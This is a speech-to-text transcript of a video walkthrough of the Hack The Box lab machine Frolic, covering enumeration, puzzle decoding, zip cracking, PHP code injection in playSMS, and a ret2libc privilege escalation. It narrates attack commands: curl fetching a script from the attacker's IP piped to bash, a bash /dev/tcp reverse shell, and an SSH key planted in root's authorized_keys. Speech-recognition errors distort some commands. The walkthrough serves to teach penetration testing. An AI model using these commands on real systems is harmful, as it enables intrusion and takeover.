 what's going on YouTube this is IPS I can be doing Frolic from hack the box which was a relatively easy box as long as you're good at doing recon enumeration in the background while you work because there's just a lot of stuff that you greeted with after doing an nmap it's like an SMB server two web servers and one of those web servers has a bunch of directories with random stuff in each directory so if you're not good at just putting things in the background while you work you'll go down a rabbit hole and get stuck there quite a while if you're good at doing a lot of things at once you'll go down a rabbit hole and be like you know what I'm frustrated I'm gonna go look at what my Go Buster and map whatever I had running in the background is and be like you know what I'm gonna go look at this a little bit because I'm frustrated where I'm at right now and then eventually get through all the puzzle and once you do that you get a shell in the box and you're greeted with a relatively easy ROP exploit which is like a buffer overflow we've done a few of those in the past so I don't expect that to be heard and then for the extra content at the end of the video I discovered that um the actual rock binary was created on the box then deleted prior to this Mission so we go in the actual disk and try to recover the deleted file to get the source of the exploit so I hope you guys enjoy this and let's get in like every box we begin with an end map with SC for default scripts SV enumerate versions OA output all floor mats but in the nmap director and call it Frolic and then the IP address which is 10 10 10 11. this can take some time to run so I've already ran it looking at the results we have a few ports open and a bunch of results from our scripts so let's start off with the ports SSH is open on Port 22 and it is running Ubuntu if we Google this Banner we could come up with the exact disk drive Ubuntu we have SMB running on Port 139 and 445 so we'll probably do SMB map and identify if there's any shares open or things like that then finally we have HTTP running on Port quad nine that is 9999 and it looks like it is engine X so version 1.10.3 and one of the scripts is telling us the host name of this box is frolic and then down here we have more results in the scripts the clock skew this is probably from the SMB as well and it's telling us that our box has a different time than the server so if we had to do any type of ticket forgery or things like that this would become important um SMB OS Discovery there we go with the hostname and then what time the um boxes it looks like we had guest authentication enabled and message signing is disabled so chances are we're not going to be abusing this because message signing is more for like SMB relay attacks which you'll rarely see in these like boot to root machines because it requires a client so that is when you intercept a client's request and then you can forward it on and then hop in the middle of that that's what taking advantage of message hunting is but since that requires Two Hosts normally probably won't be seeing it so going down that is it so let us Begin by just checking out the um SMB to see if there's any shares to do that I'm going to be using the script SMB map Dash H for hostname 1010 111. and it is enumerating the shares it does discover a print in ipcs or IPC share but no access on either so we can ignore SMB for now so let us go and check the web page by going to 10 10 10 11 and the port will be quad nines and we get the welcome to engine X banner and at the footer we do see the thank you for using nginx HTTP colon slash forlick.hdb Port 1880 and there are two odd things about this we have four lick instead of Frolic and the port 1880 when we connected on Port 99999 so let's go back to our terminal window and see if that port is open so nc-zv Z just means disconnected meatly via boost 10 10 10 111 and Port 1880 and we see it connected so the port is indeed open if we didn't do that Dash V we just have the command come back immediately if we don't have a valid Port it may come back immediately as well if we put the verbose flag there though we get a connection diffused so whenever doing the dash Z flag to immediately disconnect I always use verbose so we know that port is open let us go to it and see what is listening so 1880 is the port and we get a node red instance the first thing I'm going to do is admin password and we get a thinking thinking thinking and proxy is off I believe let's double check proxy settings it should be off if I went to the page and had no issues yep no proxy so something is odd with this page that's not coming back but anyways let us Begin by doing a lot more background Recon because we have a lot of information we have two different websites two different host names and just a lot of stuff so let's do V Etsy hosts and add the records for Frolic so frolic.htb and Frolic we got these from SMB and then we want forlick.hdb and four lick which is what nginx reported I also want to do a full nmap scan because we already know one port was open that we didn't get to detect so nmap Dash p dash and then Dash OA we'll do nmap all ports 10 10 10 11 and Dash p dash is just shorthand to do puts one through sixty five thousand five hundred thirty five which is every single port I also want to do a go Buster so we'll do go Buster Dash U HTTP colon slash slash 10 10 10 10 11.9999 Dash W user share word list then directory or dirt buster directory list 2.3 medium.text and then I think Dash o for out file we'll just do go Buster Dash root DOT log so while go Buster runs we do get a response back right away saying admin is open this still hasn't come back I'm going to refresh the page and try a different login so we'll do test test and we get login failed let's try that admin admin right away login failed so if we send this over into prep Suite and then turn intercept on send this over to the repeater tab click go and we have invalid resource owner credentials and the important thing to note is there's no cross-site request forgery checks so if we wanted to run Hydra something we probably could easily let's just try admin and password to see if this one works and we're getting a long waiting so maybe admin password hangs this if we try admin admin again let's cancel and go and we get invalid resource owner credentials do this a few times and we get too many login attempts wait 10 minutes and try again so the combination of admin password hanging it and then there being some type of Brute Force detection means I'm probably going to start ignoring nerd red until I have actual credentials because well I can't brute for something that has a limit on the number of login attempts I can do so for now let's ignore this and go back to 10 10 10 11. and going back to a go Buster we have admin test Dev and backup and we could also if we turn intercept off try uh frolic.hdb Port 9999 and we get welcome to nginx we can try forlick.hdb I'm just seeing if there's any type of virtual host routing which would have brought us to a different page doesn't seem to be that way so let's just go through what nginx has discovered so we have slash admin so let's go to slash admin and we see a login panel let's go see what else there is so frolic.hdb slash was it test Dev backup and loop so go to test we have a PHP info page scrolling down if there's anything interesting Let's see we have allow URL include to off so this means if we find any lfis they're probably not going to be a remote file inclusion because this parameter essentially this just means include statements in PHP can't be URLs to remote servers if we look at like cookie domain let's see cookie entropy we have session save path varlib PHP sessions so if we find any lfis we may want to go poke around the cookies that PHP writes but other than this nothing really interesting from PHP info so let's go to the next one slash Dev so copy this and do Dev we get a 403 Forbidden and then there's backup and loop so let's go to back up we get password text user text and loop if we view the source we can see the different line entries the reason being um there's no like colon B colon uh bracket angle bracket B angle bracket which is line breaks in HTML so we got three files and backup password.txt is password I'm not human so let us begin Now by creating password.txt but I'm not human there and the other file was user.txt user as admin so we could try this back in node-red but we have to wait 10 minutes for that um login attempt limit to expire so see we can see 2321 GMT so that was probably eight minutes ago so always handy to keep these old sessions up because you never know when you want to look back at the time so what other directory is there we have slash Loop which is a 301 and let's see where that goes so slash Loop gets or forbidden so let us do some more uh background stuff and we'll do admin test Dev backup Loop so we'll do 4 i n admin Dev test backup Loop do and we can just do Echo I to make sure a loop works so uh for I and maybe I don't put it in quotes there we go so I want a entry for each one and we're gonna do go Buster so do Go Buster Dash U HTTP 10 10 10 11 colon 9999 slash I then Dash W for word list user share dirt buster Direct word list then directory list 2.3 medium and then Dash o would do go Buster Dash I DOT log that should be good done so now we got a bunch of go busters running and we shouldn't overload the server I may want to actually do a dash t for Threads to make this go a little bit quicker so do Dash t this is for Threads and we'll say 50 threads and see how this performs because we've been running this go Buster for a while and it's only at 17 and that's a bit slow for me so putting this to 50 threads has increased its speed dramatically so the default I think is 10 threads yep 10 threads so while that all goes let us start looking at this um login page so I try admin and the password I'm not human I think that's what it was let's go and refer back to password.txt it is if we click login we get you have two attempts left and I just noticed I have verp on and looking at the proxy tab we have intercept off so if we click go again we're noticing it's not sending anything we get this response instantly and nothing gets sent so let's begin looking at the source code so we have JavaScript login.js and we do see if usernames admin and password is equal to Super Duper low uh super duper looper password underscore LOL do login success and change the window title to success.html so let us try admin uh refresh the page admin and put that password in Click login log in successfully and we should turn burp off of intercept mode going back to the page we get a bunch of weird encoding looking at the source same thing so I do a bunch of Google's I'm going to turn uh burp Suite off this add-on is Foxy proxy so that's just why toggle burp Sweden not burp sweet but anyways I'm gonna do a bunch of Googles with like text encoding uh punctuation marks and I don't see anything here we'll do text encoding period exclamation question mark see if I get any results here nothing really that interesting so I'm just gonna go and copy this whole line and see what Google says about it and the third result we have okay program language and this looks a lot like it so if I go to it we can see it's got a okay interpreter so if we paste this and click execute we can see it has translated this gibberish into nothing here check slash ASD s-i whatever so let us go and put that back in and we get another challenge so this looks like it's going to be base64. just based upon the character set saying pluses up the case lowercase and slash just looks like base64. so we do VI and we'll call this um random page.b64. paste this in base64-d and we get invalid input on this so I'm just going to go and add like an equals for padding to see if that fixes it does not do another equals don't get it and then another and base64 uses equals for padding if it's not I think divisible by four so that's why you can have up to three but while doing that I notice there's spaces in here so let's remove all the spaces from the document so I did to enter um whatever mode it's called in VI when you do colon then s slash space slash so search for all spaces replace them with nothing so I just put another slash and G for Global to make this happen multiple times now we have six substitutions on one line it removed all the spaces and space is not a valid base64 character so that's why I did it and now we're not getting any error messages so I'm going to do this and then we'll call this uh random underscore page run a file against it and file is going to tell us that this is a zip archive so I'm going to rename random page to be randompage.zip and then we'll do um zip info on random page we see there's a file called index.php in it so let's do unzip randompage.zip and it's asking for a password so I'm just going to put random thing and we don't have the password so I'm going to a program called zip to John which is going to convert this file into a hash that we can then crack so zip to John randompage.zip and then I wonder if we can just direct this to a file uh random page.zip dot hash cap that file and to do that quickly without copying it I just hit alt period and that Cycles through previous arguments you've typed in commands so we have random underscore page dot hash to just be a hash so we can just do John dash dash word list user share word list Rock U dot text on randompage dot zip dot hash if we could Spell wordless correctly I think it's word list equals there we go and John instantly cracks this so let's just get rid of the word list argument then we can do dash dash show or we can see it told us the password right here where we can see randompage.zip Slash index.php has the password of password something we probably should have tried just by default but now unzipping that gives us index.php which in return looks like a bunch of hex so and I say hex just because this looks like um a through uh F I think and one through zero or whatnot to decode it we just pipe the output into a program called xxd and then do Dash ER for reverse and Dash p is just going to mean it's only hex and we get base64. so we can put this in the file index.php.b64. [Music] and then base64--d to decode it and that's odd if we VI index.php it only did the hex oh dot b64 tab auto complete screwed me so let's do basics for index.php DOT b64. that's really funny that um hex was a valid character set for a base64 so it actually did decode it just did it wrong so hey 64-d index.php.b64 and we get a bunch of weird things so just like last time I'm going to play with the padding to see if I can make this base64 correct n equals error let's take an equals away error and let's take the other equals away and an error so every time we're getting invalid input which I guess will be fine and let's just see if we can decode what this is foreign Fox and if we looked at the page that had the okay thing it has a link to the language but if we just do like decode plus um bracket Dash Arrow if this comes up with anything it does not just pasting it in and Maybe not decode yeah if we type decode and then put in what the ciphertext is I guess you can call this we get a link that says what type of encoding scheme it is we go to the same exact site that we were to do the okay click execute and we just get decode I don't think I pasted it in thank you so we get I don't know and that's looking wrong to me let's see what I did wrong if we do V index.php.b64 let's try putting this all on one line so we don't get see if that fixes the base64 error so base64 -d index.php.b64. and we get more text it's still invalid input so let us play with the padding to see if we can make it valid and doesn't look like we can but we definitely have more input so I think the lesson to take away here is if you get a error messages on encoding make sure you try a lot of things to get it on um see if there's more information because you never know where it's stopping so paste all this in and we get I don't know what is pass so it looks like maybe if we uh what is it xxd let's create this file again okay let's cat this and do Echo dash n maybe each of these is one line out of curiosity a64-d that decodes let's try this line Echo dash n paste base64--d that decodes let's try this very bottom line Echo dash n base64-d so every line actually decodes if you do it one by one so let's do for i n Cat index dot PHP do um Echo dash n I pipe it to base64-d done and again I really gotta name my files a bit better let's put dot b64 on the end of this and weird get a bunch of padding errors anyways I don't know how to get there is error messages out I think this is what the text we want is so let's copy this and we'll put this in password.txt assuming this is a password so let's revisit all the previous Recon we've done going back to the very first Go Buster we don't have any other extra directories going to this one it looks like a few may have finished so let us do cat go Buster Dash uh admin.log we just get CSS and Js let's do what is it doing now test hasn't found anything let's try backup probably hasn't ran yet root we already know what that one is so go Buster is still running so while that goes let's try like SMB map Dash H to pull up the arguments we want Dash U for user and we'll do oh it doesn't support files like brute forcing nope just supports password so we could hand Jam the two passwords in because it's not that much but let's just use Hydra instead to try SMB because it supports files so we'll do Hydra Dash L we only have one user so we can do lowercase to specify it's not a file and then for a password we do capital p and we do passwords.txt and we'll say SMB colon slash slash 10 10 10 10 111. and we didn't get any valid passwords so I'm just going to wait for my gobusters to finish and we'll see what information we can get from this if we look actually up the full nmap scan only found that Port 1880 which I guess um it has been 10 minutes so let's do 10 10 10. 111 colon 1880 and we can try the two passwords we have I don't want to throw Hydra against this mainly just because we know there is some type of timeout after numbers of logins so I just want to be careful with that so remember what I'm not human is and copy I don't know what is pass so we'll do admin I'm not human login failed but I don't know what is passed login failed so nothing with node-red all we can do is hope that our Recon gives us more pages to look at actually um dev has two pages so did I catch that and just miss it we can't go Buster Dash Dev we have test and backup so let's check what that is so let's do frog.hdb slash Dev test choosing to open a binary file sure I'll save that move downloads test here file and test we see it's ASCII text it and it just says test okay that is odd let's do slash backup good Buster saying it's a 301 redirect so let's see where it takes us um it just says slash play SMS so let's try going to four lick.htb slash play SMS and try the login so admin uh what is human invalid username and password and then let's do I don't know what is pass paste this in and we get a login to this service so what I'm going to do is just a quick search point on this to see if there's any known exploits so searchploit play SMS and we see quite a few so it looks like we should find what version this is so let's see application further let's see is there anything that tells us the version reports view log version maybe not and looking for like a version a copyright or something so let's see preferences administrator see go in the source version no copyright no so we may just blindly try to exploit this we can try play SMS slash admin maybe that exists does not so at this point I'd either go and see if there's an open source product and then see the directory structure and how admin accounts work or just start looking at search point so let's see we got a few from 1.4 so unrestricted file upload this looks like an easy one to exploit searchploit Dash X see what this is so let's see any registered users can upload files because of not proper validation on send from file.php so let's see if we can access this file play SMS send from send from file.php if you look at this let's see we get send from file and it's doing an include here so chances are that this is it if we go down later we can see it's actually giving us the URL so this include is probably just adding.php here and accepting it so go here and then what's it do you just change the name of the file name let's see another one I don't like how that's written see import.php code execution uh try this one sometimes reading these exploit titles are a pain so we got a Metasploit module I don't want to use a metasplate module I want to know exactly what's going on so if I was in a rush I probably would just use the Metasploit module so let's see input accepts and reads content but when stored a payload and the CSV and upload to foreign the phone book it executes a payload okay so let's see what it's doing let's do browse and we should go to htb boxes um what is this called frolic and then we'll give it I guess we can give it test upload file invalid entry and it looks like it wants three things destination number message and username so I'm going to create a file called upload and let's do one two three we'll cancel this send this upload file found valid entries so we didn't get that error message so let's try doing what the um this says and just putting PHP code in a parameter so let's go back to upload and we're going to do PHP um we can do system who am I so in the very first field of the CSV we have PHP code go back to burp or not burp go back to Firefox browse upload upload file and we can see destination number is www data so we did execute our PHP code so let us just add a reverse shell there so we'll do system curl 10 10 14 dot see what my IP is three slash um Please Subscribe Dot sh and then we also want to pipe that over to bash so let's create that shell so let's do make dirt dub dub dub cdww and before starting a web server I always make sure that I'm in a directory where I intend to his files out of so I don't accidentally host sensitive data so we want to make Please Subscribe dot sh we'll do bash Dash C bash um I think it's bracket and we need Dash I Dev TCP 10 10 14 3 Port 9001 and then zero and one if you're wondering what the shell is it is um if you just get a reverse shell cheat sheet it is this one and right here is the shell I'm using the reason why I purchased this bash Dash C is because doing a TCP socket like this is a bash thing if I was in like a dash shell instead of bash or any other shell this may not work so I do bash Dash command and then do the reverse shell I find it just works a lot more often this way so we can do python Dash M simple HTTP server 80. save upload and then we can upload this so play SMS we'll cancel this end browse upload upload file and oh I wasn't listening on the port so we'll do NC lvnp 9001. try this again cancel upload upload file and we get a show out of curiosity I'm gonna kill my shell and let's just edit this um please subscribe uh script and just take that out and see if it would have worked without that bash Dash C I'm just curious at this point so let's see upload upload file and looks like it would have worked either way so now we have shell in the server the first thing I want to do is upgrade to a shell where I can do tabs and use my arrow keys so I'm gonna do python Dash C endpoint PTY pty.spawn then Dash if I can type correctly and there we go and then background this with Ctrl z type stty raw minus Echo enter and I'm not going to have or see any input what I type but I just typed FG hit enter twice and now I have my arrow keys and tab autocomplete so what I want to do is go verb dub dub dub HTML and we can see all these directories so we can kill go Buster and then probably remove go Buster from the logs and then just do find dot dash LS and maybe I should not have done that because we got a lot of files uh let's see do this search for find oh I was hoping we'd highlight everything anyways I'd highlight all these files and put them in a text file essentially if I was doing this but in terms of time I'm just going to ignore that so we'll do export term is equal to X term and that lets us clear the screen so let's LS back up to see if we missed anything looks like what we thought LS Dev backup and test um LS test index.php admin is what we expect and then this weird directory the ASD one is what we expect as well so nothing too interesting there there is was correct.zip let's see what this does um unzip crack.zip password replace no anyways I don't know exactly what that is that may be the same exact file that we had before but let's just run um Lin enum on this to see if there's any easy exploit paths so go back into a www directory and I'm going to copy slash opt linenum linenum.sh here run python-m simple HTTP server go over here and just do curl 10 10 14 3 uh Lin anum.sh ipe that over to bash let this run if you don't have this you can just search GitHub Lin anum.sh and there'll be plenty of examples and what I do is probably just pick the one that has the latest commit so this was on January 24th this is on January 24th I don't know when this is so were these the same reboot user reboot user yeah so probably this is the one I have and let this run and as this is running I notice a weird file home ayush and then it was um dot romp ayush did I say that correct there we go dot binary slash ROM so this looks like an interesting file that we definitely want to look at so we probably can just Ctrl C out of this linenium and begin looking at it we can also look at the bash history for the two users so home I use cat dot bash history permission denied um user.txt 33 characters so that's probably the hash for the user um home sahay cat bash history cat my SQL history mission tonight on booth so let's just look at that um one file we saw that was a suid file called ROP so if we execute Rob and wants a message so we'll do please subscribe and leave a comment and we just see message sent so let us go and send this over to our box so base64 in code drop and then copy and paste it over to our box to transfer so copied and now let's do make a directory or E I guess and then V rob.b64 paste it page 64-d on it and then probably chmod plus X and then GDB Raw so if we run hello world it runs so the first thing I want to do is a pattern create and let's give it 100 characters and see if the program crashes so pattern create 100 and then we'll just copy this in to the program and see what happens so run paste that in and we get a segful so we know the program may have a buffer overflow because it can't really handle the 100 characters of input giving it more creates a crash so let's copy this and we'll do pattern offset on what it was and we see it found that at register 52. so what this is I'm guessing um uh four one is I want to say a and four two is B so it's probably uh there oh EIP duh so this is this so we see four one is hex four a four seven is G then a a that's a g a a and if we look at exactly what we sent it what we sent it is right here and this is at character 52 so that's what pattern offset said uh did for us so if we do python-c print a times 52. copy paste and then we can do um dead code oh we have to do run we can see EIP is set to dead and then ESP is set to code so we know we have a buffer overflow and we can control all this and because it says or the binary is called ROP I'm assuming we have to do some type of um drop attack return oriented programming I think is what it stands for but before we make any exploits let's just see if there's anything else we have to take into account for so I'm going to run check SEC and we see stat canaries are disabled fortifies disabled NX which is um read-only memory or depth that is enabled Pi is disabled and Rel row is partial so if we look at netcat I do want to do cat process kernel randomize VA space and we see that is set to zero so we know that um aslr is off if it's one I believe it answers what the binary says which is pi and if it's set to 2 even if Pi is disabled um aslr may still be enabled so there's that um another thing I want to look at is just you name Dash a and we are on a 32-bit system so return oriented programming or rap attacks are relatively simple and if this goes too fast for you I'd recommend looking at my bitter man video or October or order videos but I go more in depth so let's just get the important things we need so let's do ldd on ROP and we want to get the libsy address so let's uh go to pane four we can quit V exploit.pi and lib C is equal to that the other thing we need is to get the location of system and exit so we'll do read elf and I think it's dash s on Rob and then grab for system whoops we need to do a read elf on lib C so that's slash lib then I 386 I think it's libc.so.6 there we go grep Dash I system and we just want to get the system at at glib C let's copy this system is equal to that let's do 0x then to be kind let's do exit as well so switching over instead of system exit and we want exit at glib C copy this and the very final thing is we need a string that has slash bin slash sh so let's do strings Dash ATX on lib C which is this directory and grep for bin sh we see the string bin sh is at 15 ba 0b so we'll copy this put that there do 0x and let's just pad this so it looks nice and is an even eight characters of memory address so now we just input struct and then we can do system is equal to uh lib C plus its address and do the same thing with the other ones because hold on system isn't actually at the address zero zero zero three ad0 it's at the offset of 380 after the web c so we're going to libsy's address and then going to where system occurs within libc hopefully that makes sense but next thing we need to do is just struct dot pack and then do this for little endian and I'm just going to go to the other lines before I end the period so I can just end the parentheses so I can just hit period and paste what I had done so do that to each of these lines and we can do payload is equal to system exit then sh print the payload and I realize this isn't a python 3. I don't know if the box has python three I know it has python 2 because I use Python 2 with the input PTY command so that's why I'm doing it right now I'm just making sure my exploit looks fine we have a memory address there which is eight characters memory address there memory address there and zero a which is a null byte because it's a line Terminator so we know a payload works the last thing we just need to do is create a buffer and that is send it 52 a user any character we want so uh offer I don't like that it's highlighting buffer and green because that means it may be another command so we'll do junk okay if we run exploit.pi it looks like it's good so we can base64-w0 and that's just going to put everything on one line it's kind of funny that Basics Force says core 2. just random but let's go to Dev shm and we'll do Echo dash n paste the base64 and direct that to exploit dot pi and if we cat exploit dot pi uh we just get the base64 because I forgot to do Echo dash n paste that put the pipe base64 Dash D exploit dot pi cat exploit.pi and there we go wait cat exploit.pi that's not right I wanna cat the full script base64 the full script there we go and that's what I want to do so let's face 64-d no Echo dash n paste pipe base64-d direct it to exploit.py cat exploit.py and we are good so now we can use CD Dash to go to a previous working directory it's a pretty cool Nifty trick but we can just do dot slash Rock python uh Dev shm exploit dot pi and we are now root so first try that return to libsy worked it's a really exploit to pull off if you were lost definitely check out bitter man or October so if we go to CD slash root we can get the root.text if we wanted to uh we can look at bash history for all the users so we can see this is just setting up the box pretty good at home I think it's ayushu CD slash home CD ayush we can cap this dot bash history and let's see oh they called this exploit script exploit.pi as well I'm just looking to see if they put like um node Red's password and the history but we do see rob.c so that's interesting so we they created the rob.c here let's see Rob Dot drop.c hmod 600 user.text no CD command and then deleted it so chances are at one point the file rob.c existed here so return to that in a second I just want to look at it's a haze files bash history uh ngrok GDB root rot foreign so this is just doing the CH mods so it looks like maybe wait home are you wrapped at C PWD sahei okay so sahi went into ayush's directory and then created drop.c confusing uh PWD lsla class dot bash history we're up disable aslr bunch of things not gonna worry about it if we cat MySQL history we also don't have anything so let's actually try to restore the file so if we go to ayush dot binary was that slash drop and let's just do a let's see scrap Dash a put this in we'll do Dash B10 A10 and we'll do Dev sda1 and that's the block device for this and let this run so what this is doing is searching the block device Dev sda1 for usage program message which we know the source code contains because that's what it prints and then grabbing the 10 lines before it and the 10 lines after it so we'll let this command run and see if it returns us the file grip had aired out saying memory exhausted so I'm gonna try the strings command on dev sda1 and then we'll just grep for that same message and do Dash B and A10 so b10-810 and see if this one actually finds it so pause the video again and let this run and hopefully we find the source code to rock.c now that our Command has finished let's just go back and search for angle bracket message angle bracket and look for lines we expect to see around it this very first hit we see it's probably going to be the binary because if my strings the robbed binary I'm guessing this is the type of things I would see so let's just go back until we start seeing some C source code this is beginning to be interesting as we see string text Global type but keep going back and here we go we have some source code it's not super easy to read as we can see there's some repeats and if we grab like let's say all of this oh we missed two lines so grab this let's create a new window V rob.c and paste we should set mode to paste and now we can paste and then let's go back to this window and grab stuff around this next one so grab this oh we can probably grab that paste and then start trying to piece what we believe the source code is so and Main looks fine we probably are missing curly braces then void Vaughn um probably the same thing and the second time we copied was probably a mistake I don't really see anything too interesting so maybe we just add these curly braces and we can see if this actually compiles so GCC rob.c and if we do it LS we have a DOT out so we can remove a DOT out go back to um the server if we go into CD slash home uh CD I think so hey grep for GCC on bash history we can get the exact ergs that we used to compile this and then do the GCC command and if we do an execution on Route input 52 A's python-c [Music] um Echo a times 52. we should crash this program uh let's see what did I screw up that should work Echo now let's do python.c oh print a times 52. yep that was what I mistake I screwed up print and we get a segmentation fault just as we expected if we do 40 A's which is what the buffer size is it doesn't crash so I'm relatively confident we have successfully copied that disk now if we wanted to we could actually just um copy the disk via SSH and then do the file recovery Auto local machine so to do that let's um whoops let's do a cat on our dot SSH auth uh idrsa dot Pub to copy our public key and copy this let's go back to the server go into slash root make dot SSH go into dot SSH and then Echo the public key into authorized Keys CH mod this to 600 and we should now be able to SSH into 10 10 10 11. okay so now we just need to copy the file so let's exit this SSH 10 10 10 11. then do quotes DD input file Dev SDA pipe that over to gzip-1 for fast encryption then just dash for standard out close off the SSH command do another pipe and send that to DD output file is equal to frolic.gz and then we can split the pane do a watch Dash N1 and put um du-s frolic.gz and this will probably take a while to copy but once it's done we should be able to have a physical copy of this disk on our local box so the copy is done and we can see the total size of the disk was around 11 gigabytes and it compressed all the way down to 1.2 gigabytes so what we have to do is now uncompress that to get back to the 11 gigs so I'm going to do gzip Dash D on frolic.gz and choose yes because it already exists I had a bad video take my screen went in hibernation and then had annoying a nut screen um screensaver went up and then I had an annoying notification up here saying automatic suspensions disabled or something and it bothered me so I already did this portion of the video so we're just gonna wait for this gzip to finish and then we can begin restoring the files so the DD is done I'm just gonna do a du Dash HS on Frolic and we see it is 11 gigs so I'm going to pass it to a recovery program called photorec but before I do that let's make the directory recover so we'll do photo wreck frolic don't contain from a previous session let's do the disc 10 out of 10 gigs choose the very first petition because that is the largest we could have done no petition done the whole disk um this should be a EXT probably three file system um let's do unallocated space only first because if we did whole this thing would be uh take forever so let's specify the recover directory and then we're going to hit C when the destination is correct as that's what it says to do and probably going to take around 10 to 15 minutes I would guess for this to complete and we can look at the files it generates so if we open a new tab go into recover we can see recoup der one if we do an OS on that we get a bunch of files so if we wanted to we could cat recuper one and then a random file and see what it is uh this looks like it's probably something from apt so that took about I would say three minutes maybe three minutes and 30 seconds if we do another LS we have three different directories so I'm gonna do uh grip on message and we should do uh Dash R to make that recursive and just go from here and see which files match this it'll probably be a few since there's probably the binary as well so we'll see if we can find the actual source code so we had a few hits these elf files we don't really care about but we do have this one that looks the most interesting I'm not sure exactly what this is maybe it's part of the web page since that's a PHP file and this is definitely PHP code but this dot C file has printf so this looks much like the code so let's take a look at what this file is and there we have it the source code completely intact and if you wanted to this is the source to the ROP exploit we can see them assigning 40 characters above a space to text then doing an insecure Str copy and then saying the message was sent and printing the message so take care guys hope you enjoyed the video and I will see you all next week